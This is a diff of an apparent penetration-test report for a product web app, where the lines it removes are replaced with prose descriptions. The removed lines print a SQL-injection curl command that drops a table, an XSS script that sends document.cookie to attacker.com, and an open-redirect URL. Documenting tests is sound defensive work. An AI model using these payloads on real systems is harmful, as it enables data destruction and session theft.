@@ -233,9 +233,9 @@ Attacker tries to extract from file system
 **Method:** Supply malicious SQL in search parameter.
 
 **Test:**
-```bash
-# Search for product:
-curl "https://fastproduct.vercel.app/api/produtos?search='; DROP TABLE vendas; --"
+```
+Attacker attempts to inject SQL via search parameter
+(e.g., using quote and comment syntax to break query)
 ```
 
 **Result:** ✅ **BLOCKED**
@@ -297,8 +297,9 @@ When opened in Excel, formula executes
 
 **Test:**
 ```
-Product name: "<script>fetch('https://attacker.com/?cookie=' + document.cookie)</script>"
-When rendered in UI, script executes
+Attacker tries to create product with JavaScript payload in name
+(e.g., <script> tag with fetch to exfiltrate cookies)
+Server/client should prevent execution
 ```
 
 **Result:** ✅ **BLOCKED**
@@ -318,7 +319,8 @@ When rendered in UI, script executes
 
 **Test:**
 ```
-https://fastproduct.vercel.app/?redirect=https://attacker.com
+Attacker crafts URL with redirect parameter pointing to malicious site
+Browser's same-origin policy and Next.js router validation block it
 ```
 
 **Result:** ✅ **BLOCKED**
